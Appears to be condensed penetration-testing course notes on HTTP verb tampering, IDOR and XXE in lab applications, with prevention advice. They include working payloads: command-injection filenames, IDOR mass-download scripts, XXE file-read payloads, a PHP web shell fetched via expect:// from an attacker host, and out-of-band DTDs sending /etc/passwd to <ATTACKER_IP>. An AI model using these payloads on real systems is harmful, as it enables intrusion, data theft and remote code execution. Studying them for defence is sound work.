# Web Attacks

Three attack classes covered here, all common in any web application: **HTTP Verb Tampering** (unexpected HTTP methods bypass authorization or other security controls), **IDOR** (direct object references + weak access control = other users' data), and **XXE** (outdated XML libraries parsing user XML → local file disclosure, source code, cred theft, RCE). Detect, exploit, prevent for each.

## Intro to HTTP Verb Tampering

Dev shops think in GET and POST, but any client can send any of HTTP's 9 verbs. If both app and server only accept GET/POST, other verbs just error out (info disclosure at worst). If the server accepts more methods than the app was coded to handle → tampering: access to restricted functionality or bypass of security controls.

The verbs that matter beyond GET/POST: HEAD (GET minus the response body), PUT (write payload to a location), DELETE (delete the resource), OPTIONS (list accepted verbs), PATCH (partial modification). PUT/DELETE against the webroot are obviously sensitive. Key point: the vuln originates from a misconfiguration in *either* the web server *or* the application code.

**Insecure configurations** — auth limited to specific methods leaves others open:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

HEAD (or anything unlisted) skips the auth entirely.

**Insecure coding** — filters that don't cover all methods:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

Filter checks `$_GET`, but the query uses `$_REQUEST` (GET + POST). Send the injection via POST → GET params are empty → filter passes → SQLi through the verb inconsistency. This coding type is far more common in the wild than the config type.

## Bypassing Basic Authentication

Config-type verb tampering → bypass HTTP Basic Auth. Straightforward: try alternate methods and watch handling. Scanners catch the config type reliably; the coding type needs active filter-bypass testing.

**Identify**: File Manager app; its Reset button hits `/admin/reset.php` and prompts for Basic Auth (401 without creds). Visiting `/admin` directly also prompts → the whole directory is restricted.

**Exploit**: intercept the reset request — it's a GET. Burp right-click → Change Request Method → POST: still 401, so auth covers GET+POST. Check what else the server accepts:

```bash
curl -i -X OPTIONS http://<SERVER_IP>:<PORT>/
# Allow: POST,OPTIONS,HEAD,GET
```

HEAD is accepted (default on many servers). Change the request to HEAD → no login prompt, no 401, empty body as expected — but the reset function still executed (files gone). No output needed when the action itself is the goal.

## Bypassing Security Filters

Coding-type verb tampering → bypass back-end injection filters. Pattern: filter only inspects `$_POST['param']` (or only `$_GET`) while the functionality reads the other.

**Identify**: creating a file named `test;` returns `Malicious Request Denied!` — a filter exists and blocks injection attempts in the normal flow.

**Exploit**: intercept the request, Change Request Method. The denial message disappears and the file is created — filter missed the other verb. Confirm with real command injection: filename `file1; touch file2;` under the swapped method → both files appear. The app was otherwise secure against command injection; verb tampering unlocked it.

## Verb Tampering Prevention

**Insecure configuration** — never scope authorization to specific verbs. Apache (`000-default.conf` / `.htaccess`):

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

`<Limit GET>` protects only GET — POST/HEAD/OPTIONS walk in. Tomcat `web.xml` has the same footgun via `<http-method>GET</http-method>` inside `security-constraint`; ASP.NET `web.config` via `allow verbs="GET"` / `deny verbs="GET"`. Fix: allow/deny ALL methods; if you must enumerate, use the inverse keywords — `LimitExcept` (Apache), `http-method-omission` (Tomcat), `add`/`remove` (ASP.NET) — which cover everything *except* the listed verb. Also disable HEAD server-wide unless actually needed.

**Insecure coding** — hunt inconsistencies between the method a filter checks and the method the functionality uses. The File Manager's actual flaw:

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

Perfectly fine against command injection in isolation — but the filter reads `$_POST` while the command reads `$_REQUEST`. In production these two lines usually live in different functions, which is why it survives review. Fix: keep HTTP method usage consistent per functionality, and make security filters check *all* request parameters — `$_REQUEST['param']` (PHP), `request.getParameter('param')` (Java), `Request['param']` (C#).

## Intro to IDOR

IDOR = the app exposes a direct reference to an object (file, DB row) that the user controls, and the back-end lacks the access control to stop them pulling objects that aren't theirs. `download.php?file_id=123` → try `file_id=124`. Guessable IDs make it mass-exploitable.

The exposed reference alone isn't the vuln — the missing back-end access control is. Most apps "control" access by hiding links in the front-end; manually manipulated HTTP requests blow past that. Building solid access control (e.g. RBAC) is genuinely hard, automating its testing is hard, so IDOR survives to production even at Facebook/Instagram/Twitter scale.

Impact ladder: **Information Disclosure** (read others' personal files, credit card data) → modify/delete others' data (account takeover via email + password reset) → **Insecure Function Calls**: call admin-only APIs as a standard user (change passwords, grant roles) → full app takeover.

## Identifying IDORs

**URL parameters & APIs** — study every request that returns a file/resource for object references (`?uid=1`, `?filename=file_1.pdf`) — in URL params, APIs, or headers like cookies. Increment values (`?uid=2`), or fuzz thousands of variations. Hits on data that isn't ours = IDOR.

**AJAX calls** — JavaScript-framework apps may ship *all* function calls to the front-end and merely disable the ones your role shouldn't use. Read the JS for admin/unused endpoints:

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

Never invoked as a non-admin, but callable once found. Same applies to back-end source when available (open-source apps).

**Understand hashing/encoding** — references may be encoded or hashed. base64 is recognizable by charset: `?filename=ZmlsZV8xMjMucGRm` decodes to `file_123.pdf` → re-encode `file_124.pdf` and request it. Hashed references (`?filename=c81e728d...`) look secure, but if the front-end computes the hash, the recipe is right there:

```javascript
data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
```

Otherwise identify the algorithm with hash-identifier tools and test candidate inputs until one matches.

**Compare user roles** — register two users, diff their requests and references. If User1's API call (`/services/data/salaries/users/1`) can be replayed verbatim under User2's session, the back-end only checks "logged in", not "owns this object". Even when you can't compute other users' parameters, that's a confirmed access control flaw worth chasing.

## Mass IDOR Enumeration

**Insecure parameters** — Employee Manager example: `/documents.php?uid=1` lists own documents with a predictable static file pattern (`/documents/Invoice_1_09_2021.pdf` — uid + month/year) — the most basic "static file IDOR", fuzzable but assumes filename prefixes. The stronger bug: the page takes `uid` as a GET parameter and trusts it. Changing to `?uid=2` renders an identical-looking page — watch the linked files, not the layout: `/documents/Invoice_2_08_2020.pdf` — that's employee 2's data. Always compare source code and page size, not just the rendered output. Same class: filter params like `uid_filter=1` that can be changed or removed to dump everything.

**Mass enumeration** — loop it. Grab the unique HTML marker for links and grep it:

```bash
curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Regex beats trimming commands. Full harvest:

```bash
#!/bin/bash

url="http://<SERVER_IP>:<PORT>"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Burp Intruder / ZAP Fuzzer accomplish the same; the bash loop is usually fastest to write.

## Bypassing Encoded References

Contracts page downloads via POST to `/download.php` with `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b` — md5-looking hash (download scripts like this avoid direct file links). One-way function, so attack it by hashing candidates and comparing: `echo -n 1 | md5sum` → no match; uid/username/filename all miss. At this point it could be a Secure Direct Object Reference — unless the hash is computed client-side.

**Function disclosure** — JS frameworks often do sensitive work front-end. The link calls `javascript:downloadContract('1')`:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Recipe: md5(base64(uid)). Verify:

```bash
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b — matches
```

(`-n` on echo and `-w 0` on base64 strip newlines — hashing a trailing newline produces a different hash.) Reversing the recipe converts the secure reference back into an IDOR.

**Mass enumeration**:

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<SERVER_IP>:<PORT>/download.php
    done
done
```

`-OJ` saves each file under its Content-Disposition filename (`contract_<hash>.pdf`).

## IDOR in Insecure APIs

IDOR Insecure Function Calls = executing functions/APIs as another user: change their info, reset their password, buy with their payment data. Frequently chained with an info-disclosure IDOR that supplies the needed values.

**Identifying** — Edit Profile sends a PUT to `/profile/api.php/profile/1` (PUT = update, POST = create, DELETE = delete, GET = read) with:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Hidden params beyond the form fields (uid, uuid, role) — and role also rides in the `Cookie: role=employee` header. Privileges passed in the client-controlled request is the classic flaw: manipulate them unless the back-end checks otherwise.

**Exploiting** — four angles: change own uid (account takeover), change another user's details, create/delete users, change own role. Results here: `"uid": 2` against endpoint `/1` → `uid mismatch`; endpoint `/2` + `"uid": 2` → `uuid mismatch` (they're comparing our uuid against the target's); POST to create → `Creating new employees is for admins only`; DELETE → same; role `admin` → `Invalid role` (guessing role names blindly fails). All function-call paths blocked — but the API's GET was never tested. When write paths fail, test the read path for disclosure that unlocks them.

## Chaining IDOR Vulnerabilities

The page loads user details via GET to the same endpoint; the only authorization in the request is the `role=employee` cookie (no JWT, nothing user-specific). Even with a token, unless it's actively compared to the requested object, disclosure stands.

**Information disclosure** — GET `/profile/api.php/profile/2` returns user 2 in full:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

The uuid — uncalculable before — is now in hand.

**Modifying other users' details** — PUT to `/profile/api.php/profile/2` with uid 2 + their real uuid + modifications: no mismatch errors, changes persist. Escalation options: swap their email and request a password reset (link lands in your inbox → account takeover); drop an XSS payload in `about` (fires when they open their profile page).

**Chaining both** — enumerate all users via the GET disclosure; find the admin:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

Now the real role name is known. PUT own profile with `"role": "web_admin"` — no `Invalid role`, no access control errors, role sticks. Refresh (or set `Cookie: role=web_admin` manually), then POST to create a new user: succeeds. Disclosure IDOR fed the function-call IDOR past every check. With the admin role, mass assignment across all users follows (XSS in every profile, or rewrite everyone's email — GET each uuid, PUT each account).

## IDOR Prevention

**Object-level access control** — RBAC mapped to every object/resource; each request's role/privileges tested against the object before allow/deny:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

Crucially, the role comes from the back-end RBAC via the session token — never from the request body or a cookie, both of which the user controls.

**Object referencing** — direct references are acceptable *only* on top of solid access control. Even then, avoid cleartext/simple patterns (`uid=1`); use salted hashes or UUIDs (UUID V4: `89c9b29b-d19f-4515-b2dd-abb6e693eb20`) mapped to objects in the DB:

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Never compute hashes front-end — generate at object creation, store server-side, keep DB maps for cross-referencing. Caveats: UUIDs make IDOR harder to *test*, which is why referencing is step two after access control; and broken access control falls to session-replay techniques regardless of reference strength.

## Intro to XXE

XXE: user-controlled XML parsed unsanitized by outdated libraries → XML features turned malicious (file disclosure up to server shutdown; OWASP Top 10).

XML refresher — what matters for exploitation: tags (`<date>`), entities (XML variables, `&lt;`), elements (root + children, value between start/end tags), attributes in tags (`version="1.0"`), and the declaration line. Reserved chars `< > & "` need entity references. DTDs validate structure, declared inline after the declaration or externally:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

Custom entities in the DTD: `<!ENTITY company "Inlane Freight">`, referenced as `&company;` and substituted at parse time. The attack primitive — external entities via SYSTEM (PUBLIC works too in most cases):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

Server-side parsing (SOAP APIs, web forms) + `&signature;` = the parser reads the back-end file into the entity, and the response may display it.

## Local File Disclosure

**Identifying** — find pages accepting XML input. Contact form POSTs XML to `/submitDetails.php`; the response echoes the `email` element value ("Check your email X for further instructions") — note which elements get displayed; that's the injection sink. Test entity support first:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Put `&company;` in the email element → response prints "Inlane Freight" = XML injection works (a patched app would print the raw `&company;`). (If the request had a DOCTYPE already, just add the ENTITY to it.) Bonus: apps defaulting to JSON may still accept XML — swap Content-Type to `application/xml`, convert the body, test anyway.

**Reading sensitive files** — same trick with SYSTEM:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

/etc/passwd comes back in the response. Config files with passwords, `id_rsa` keys — file disclosure chains into server access. Java apps may accept a directory path and return a listing, handy for locating secrets.

**Reading source code** — `file:///var/www/html/index.php` returns nothing: PHP source contains XML-special chars (`< > &`) that break the entity, and binary breaks it too. PHP fix — base64 via the filter wrapper:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Decode the returned string (Burp's Inspector decodes it in place). PHP-only trick; the next section covers the universal method.

**RCE with XXE** — escalation order: hunt SSH keys; Windows hash-stealing via calls to your server; PHP `expect://` wrapper if the expect module is enabled. Direct output → `expect://id` prints command output; complex commands (reverse shells) break the XML syntax. The efficient route — fetch a web shell:

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

`$IFS` replaces spaces; `|`, `>`, `{` also tend to break the syntax — avoid them. expect is rarely enabled on modern PHP, so XXE usually stays a disclosure primitive that feeds further access.

**Other attacks** — SSRF through XXE to enumerate internal ports/pages (per the Server-Side Attacks module). DoS via entity self-reference expansion (a0="DOS", a1="&a0;"×10, ... up to a10, memory exhaustion) — dead against modern servers like Apache that block entity loops, still worth knowing.

## Advanced File Disclosure

**CDATA exfiltration** — universal source/binary reading. Wrap the file content in `<![CDATA[ ... ]]>` so the parser treats special characters as raw. Naive attempt fails — XML won't join internal and external entities:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Bypass with **parameter entities** (start with `%`, DTD-only) — referenced from an external source, all joined entities count as external:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Host that line as xxe.dtd on your machine, then in the request:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Source code without base64 — much faster when trawling files for secrets. Note: some modern servers still refuse specific files (like index.php) due to entity/file self-reference loop protection.

**Error-based XXE** — when no entity is ever displayed (blind to output) but the app shows runtime errors. Confirm error reflection first: malformed XML (unclosed tag, or reference a non-existent entity). Then host a DTD that jams the file content into an error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The undefined entity forces an error that carries the joined `%file;` content along. Trigger:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Works for source code too (point file at it), but less reliable — error-message length limits and some special characters still break it.

## Blind Data Exfiltration

Fully blind: no output, no errors. **Out-of-band (OOB) exfiltration** — make the server send the data to us over HTTP, same pattern used for blind SQLi/command injection/XSS. DTD on our server; the file content, base64-encoded via PHP filter, rides in the URL:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

Parser resolves `%file;` → requests `http://<ATTACKER_IP>:8000/?content=WFhFX1NBTVBMRV9EQVRB` → decode. Auto-decode server side:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
vi index.php   # the code above
php -S 0.0.0.0:8000
```

Payload (the `<root>&content;</root>` reference triggers the request):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The PHP dev server log shows the hit and prints decoded /etc/passwd. Variant: DNS OOB exfiltration — encoded data as a subdomain (`ENCODEDTEXT.our.website.com`), captured with tcpdump; more setup, sometimes the only way out.

**Automated OOB** — XXEinjector covers basic XXE, CDATA, error-based, and blind OOB:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy the Burp request into a file, keep only the XML's first line, and mark the injection position with `XXEINJECT`:

```text
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
...SNIP...

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Data doesn't print (it's base64) — exfiltrated files land in `Logs/<ip>/<path>`:

```bash
cat Logs/10.129.201.94/etc/passwd.log
```

## XXE Prevention

Easier than most web vulns — root cause is usually outdated libraries, not developer-supplied code.

**Avoid outdated components** — XML parsing is handled by libraries, not hand-written. Update them. PHP's `libxml_disable_entity_loader` is deprecated since 8.0 (it enabled external entities unsafely; editors like VSCode flag it). OWASP's XXE Prevention Cheat Sheet catalogs vulnerable libraries with safe replacements. Also update everything else that parses XML: SOAP API libraries, SVG processors, PDF processors — and generally outdated components (Node modules etc.).

**Safe XML configurations** — on top of updated libraries: disable custom DTD references, external XML entities, Parameter Entity processing, XInclude support, and entity reference loops. Proper exception handling + no runtime error display (kills error-based XXE). These are workarounds/defense-in-depth, not a substitute for fixed libraries.

Where possible, drop XML entirely for JSON/YAML, avoid XML-based API standards (SOAP) in favor of JSON APIs (REST). WAF adds another layer — never rely on it alone; WAFs get bypassed.